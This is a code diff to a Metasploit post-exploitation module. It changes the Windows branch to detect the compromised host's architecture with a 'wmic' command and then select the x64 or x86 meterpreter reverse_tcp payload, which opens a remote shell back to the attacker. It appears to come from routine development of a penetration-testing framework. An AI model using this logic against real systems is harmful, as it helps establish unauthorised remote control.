@@ -78,10 +78,17 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'windows', 'win'
       platform = 'windows'
-      payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
-      larch = [ARCH_X86]
-      psh_arch = 'x86'
+      arch = cmd_exec("wmic os get osarchitecture")
+      if arch =~ /64-bit/m
+        payload_name = 'windows/x64/meterpreter/reverse_tcp'
+        larch = [ARCH_X64]
+        psh_arch = 'x64'
+      else
+        payload_name = 'windows/meterpreter/reverse_tcp'
+        larch = [ARCH_X86]
+        psh_arch = 'x86'
+      end
       vprint_status("Platform: Windows")
     when 'osx'
       platform = 'osx'
